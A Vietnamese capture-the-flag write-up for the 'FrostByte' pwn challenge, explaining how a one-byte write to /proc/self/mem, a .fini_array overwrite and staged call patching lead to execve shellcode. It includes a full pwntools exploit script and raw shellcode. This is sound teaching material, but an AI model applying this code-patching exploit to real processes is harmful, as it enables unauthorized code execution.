# Write up

## FrostByte

### 1. Phân tích ban đầu (Reconnaissance)

#### Thông tin cơ bản
*   **Chức năng:** Chương trình cho phép người dùng nhập tên file, một offset (vị trí), và **đúng 1 byte** dữ liệu. Sau đó, nó mở file, tìm đến offset đó, ghi 1 byte và thoát.
*   **Bảo vệ (Checksec):**
    *   `No PIE`: Địa chỉ code cố định (quan trọng nhất).
    *   `NX Enabled`: Không thể thực thi code trên Stack (phải ghi shellcode vào vùng có quyền Execute).
    *   `Canary found`: Có bảo vệ tràn bộ đệm (nhưng bài này ta không smash stack).

#### Lỗ hổng (Vulnerability)
Đề bài gợi ý: *"You shouldn't be writing to normal files. What is a special file you can use?"*

Lỗ hổng nằm ở việc chương trình cho phép ghi vào bất kỳ file nào mà user có quyền. Trong Linux, file ảo `/proc/self/mem` đại diện cho toàn bộ bộ nhớ của tiến trình hiện tại.
=> **Khai thác:** Ta có thể mở `/proc/self/mem` để ghi đè lên chính code của chương trình đang chạy (vùng `.text`), bỏ qua quyền Read-Only mặc định.

### Chiến lược khai thác (Exploitation Strategy)

Thách thức lớn nhất là chương trình chỉ cho phép ghi **1 byte** rồi thoát (`exit`). Để khai thác, ta cần thực hiện chuỗi các bước sau:

1.  **Hồi sinh (Resurrection):** Khiến chương trình chạy lại sau khi kết thúc để có thêm lượt ghi.
2.  **Tạo vòng lặp bất tử (Infinite Loop):** Biến chương trình thành vòng lặp vô tận để có thể ghi đè tùy ý (arbitrary write).
3.  **Inject Shellcode:** Ghi mã độc vào vùng nhớ có quyền thực thi.
4.  **Kích hoạt (Trigger):** Điều hướng luồng thực thi (EIP/RIP) nhảy vào Shellcode.

### Chi tiết kỹ thuật (Technical Deep Dive)

#### Giai đoạn 1: Hồi sinh bằng `.fini_array`
*   **Lý thuyết:** Khi hàm `main` return, `libc` sẽ gọi các hàm hủy (destructors) được lưu trong section `.fini_array`.
*   **Thực hiện:** Ta ghi đè 1 byte vào địa chỉ của `.fini_array` (`0x403df0`) để trỏ nó về địa chỉ của hàm `main` (`0x4012b5`).
*   **Kết quả:** Thay vì thoát, chương trình chạy lại `main` một lần nữa. Ta có thêm 1 mạng.

#### Giai đoạn 2: Xây dựng vòng lặp đệ quy (Recursive Loop)
Đây là phần khó nhất. Ta cần sửa code của `main` để nó tự gọi lại chính nó vĩnh viễn. Ta nhắm vào lệnh `call puts` ở cuối hàm `main` (`0x4013d8`).
Offset lệnh nhảy (`call`) được tính từ địa chỉ lệnh kế tiếp (`0x4013dd`).

*   **Vấn đề:** Để nhảy về `main` (`0x4012b5`), offset cần thiết là `0xFFFF FED9` (`-295`). Ta cần sửa 2 bytes (`FD 13` -> `FE D9`). Nhưng ta chỉ có thể sửa từng byte một, và nếu sửa sai làm code bị lỗi (invalid instruction), chương trình sẽ crash.
*   **Giải pháp - Bước đệm an toàn:**
    1.  **Lượt chạy 2 (Sửa byte thấp):** Sửa `0x13` -> `0xD9`.
        *   Đích đến tạm thời: `0x4013dd + 0xFFFF FDD9 = 0x4011b6`.
        *   Tại `0x4011b6` là lệnh `mov rdx, rsp` bên trong hàm `_start`. Đây là một điểm entry an toàn, nó khởi tạo lại thanh ghi và gọi lại `main` mà không làm hỏng Stack.
    2.  **Lượt chạy 3 (Sửa byte cao):** Sửa `0xFD` -> `0xFE`.
        *   Đích đến hoàn chỉnh: `0x4013dd + 0xFFFF FED9 = 0x4012b6`.
        *   Tại `0x4012b6` là `main+1`. Nó bỏ qua lệnh `endbr64` (vô hại) và chạy tiếp vào `push rbp`.
        *   **Kết quả:** `main` gọi `main`. Stack tăng dần nhưng rất chậm, đủ để ta ghi hàng nghìn byte mà không crash.

#### Giai đoạn 3: Ghi Shellcode
*   **Vị trí:** Hàm `setup` (`0x401296`). Hàm này không còn dùng đến, địa chỉ cố định và nằm trong vùng `.text` (có quyền thực thi `r-x`).
*   **Payload:** Shellcode `execve("/bin/sh", 0, 0)` ngắn gọn (23 bytes).

#### Giai đoạn 4: Kích hoạt (Trigger)
*   Sau khi ghi xong shellcode, ta sửa lại lệnh `call` trong vòng lặp một lần cuối.
*   **Mục tiêu:** Nhảy tới `setup` (`0x401296`).
*   **Offset:** `0x401296 - 0x4013dd = 0xFFFF FEB9`.
*   Ta chỉ cần sửa byte thấp từ `0xD9` -> `0xB9`. Byte cao `0xFE` đã đúng từ giai đoạn trước.

### Script Exploit

```python
from pwn import *

# --- Cấu hình ---
context.binary = elf = ELF('./frostbyte')
context.log_level = 'info'

p = process('./frostbyte')
# p = remote('ctf.csd.lol', 8888)

def write_byte(addr, byte_val):
    """
    Hàm gửi payload để ghi 1 byte vào địa chỉ bất kỳ
    thông qua lỗ hổng /proc/self/mem
    """
    # Gửi đường dẫn file đặc biệt
    p.sendlineafter(b': ', b'/proc/self/mem')
    # Gửi địa chỉ bộ nhớ (offset)
    p.sendlineafter(b': ', str(addr).encode())
    # Gửi byte dữ liệu
    p.sendafter(b': ', p8(byte_val))

# =================================================================
# GIAI ĐOẠN 1: HỒI SINH (Resurrection)
# =================================================================
# Sửa .fini_array trỏ về main (LSB: 0xB5)
fini_addr = 0x403df0 
log.info(f"[-] Patching .fini_array ({hex(fini_addr)}) -> 0xb5")
write_byte(fini_addr, 0xb5)
log.success("=> Main resurrected successfully.")

# =================================================================
# GIAI ĐOẠN 2: TẠO VÒNG LẶP BẤT TỬ (Infinite Loop)
# =================================================================
# Mục tiêu: Sửa lệnh 'call puts' (0x4013d8) thành 'call main+1'.
# Offset byte thấp của lệnh call
call_offset_low = 0x4013d9
# Offset byte cao của lệnh call
call_offset_high = 0x4013da

# Bước 2.1: Tạo bước đệm an toàn (Safe Bridge)
# Sửa byte thấp thành 0xD9 -> Nhảy về _start+6 (0x4011b6)
# Giúp chương trình không bị crash khi chưa sửa xong byte cao.
log.info("[-] Patching Call Low Byte -> 0xD9 (Bridge to _start)")
write_byte(call_offset_low, 0xD9)

# Bước 2.2: Hoàn tất vòng lặp đệ quy (Recursive Main)
# Sửa byte cao thành 0xFE -> Kết hợp với 0xD9 tạo thành đích đến 0x4012b6 (main+1)
log.info("[-] Patching Call High Byte -> 0xFE (Recursive Main Loop)")
write_byte(call_offset_high, 0xFE)
log.success("=> Infinite Recursive Loop Established!")

# =================================================================
# GIAI ĐOẠN 3: GHI SHELLCODE (Code Injection)
# =================================================================
# Ghi shellcode vào hàm 'setup' (0x401296)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
target_code_addr = 0x401296 

log.info(f"[-] Writing shellcode to {hex(target_code_addr)}...")
for i in range(len(shellcode)):
    write_byte(target_code_addr + i, shellcode[i])
log.success("=> Shellcode written.")

# =================================================================
# GIAI ĐOẠN 4: KÍCH HOẠT (Trigger)
# =================================================================
# Sửa lệnh call nhảy vào Shellcode (Setup)
# Target offset: FE B9
# Hiện tại: FE D9. Chỉ cần sửa byte thấp D9 -> B9.
log.info("[-] Redirecting execution to shellcode...")
write_byte(call_offset_low, 0xB9)

p.clean()

p.interactive()
```

### Bài học rút ra (Key Takeaways)
1.  **`/proc/self/mem` là cực mạnh:** Nó cho phép bypass quyền ghi của các vùng nhớ Read-Only (như `.text`), một kỹ thuật quan trọng khi gặp binary không có PIE.
2.  **Patching Code:** Việc sửa đổi mã máy (opcode) trực tiếp khi chương trình đang chạy đòi hỏi sự chính xác tuyệt đối. Một byte sai = SIGSEGV.
3.  **Intermediate Jumps (Bước nhảy đệm):** Khi cần sửa một địa chỉ nhảy (Jump target) lớn (nhiều byte), ta cần tìm một "bến đỗ tạm thời" an toàn để chương trình không crash giữa chừng.
4.  **Infinite Loop:** Trong các bài giới hạn số lần nhập liệu, ưu tiên hàng đầu luôn là tạo ra vòng lặp vô hạn.